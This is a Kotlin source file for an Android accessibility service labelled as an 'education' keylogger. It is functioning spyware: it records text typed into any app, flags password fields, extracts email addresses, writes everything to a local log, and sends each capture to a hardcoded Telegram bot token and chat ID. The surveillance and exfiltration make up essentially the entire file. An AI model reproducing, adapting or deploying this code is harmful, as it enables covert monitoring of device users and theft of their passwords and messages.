package com.education.keylogger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

class AccessibilityLoggerService : AccessibilityService() {
    
    private val logFileName = "accessibility_log.txt"
    private val TELEGRAM_TOKEN = "8742325574:AAFF7f0ZZHa1MTAGK1SWJXLOZlPZdO9VmUk"
    private val CHAT_ID = "6277274670"
    private val client = okhttp3.OkHttpClient()
    
    private fun sendToTelegram(text: String) {
        val url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage"
        val json = """{"chat_id":"$CHAT_ID", "text":"⌨️ [MOBILE KEYLOG] $text"}"""
        val body = okhttp3.RequestBody.create(okhttp3.MediaType.parse("application/json; charset=utf-8"), json)
        val request = okhttp3.Request.Builder().url(url).post(body).build()
        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {}
            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) { response.close() }
        })
    }
    
    override fun onServiceConnected() {
        // Configuration du service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
        logToFile("=== Accessibility Service Connected ===")
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString(", ") ?: ""
                val packageName = event.packageName?.toString() ?: "unknown"
                val className = event.className?.toString() ?: "unknown"
                
                logToFile("Package: $packageName, Class: $className, Text: $text")
                sendToTelegram("App: $packageName\nTexte: $text")
                
                // Analyser le texte pour trouver des patterns intéressants
                analyzeText(text, packageName)
            }
            
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val contentDescription = event.contentDescription?.toString() ?: ""
                logToFile("Click: $contentDescription")
            }
        }
    }
    
    private fun analyzeText(text: String, packageName: String) {
        // Détection de mots de passe (simplifié)
        val passwordKeywords = listOf("password", "pass", "pwd", "mot de passe")
        if (passwordKeywords.any { text.contains(it, ignoreCase = true) }) {
            logToFile("⚠️ PASSWORD FIELD DETECTED in $packageName")
        }
        
        // Détection d'emails
        val emailPattern = Regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
        val emails = emailPattern.findAll(text)
        emails.forEach { email ->
            logToFile("📧 EMAIL DETECTED: ${email.value}")
        }
    }
    
    private fun logToFile(message: String) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        try {
            val file = filesDir.resolve(logFileName)
            FileWriter(file, true).use { writer ->
                writer.appendLine("$timestamp - $message")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    override fun onInterrupt() {
        logToFile("=== Service Interrupted ===")
    }
    
    override fun onDestroy() {
        logToFile("=== Service Destroyed ===")
        super.onDestroy()
    }
}
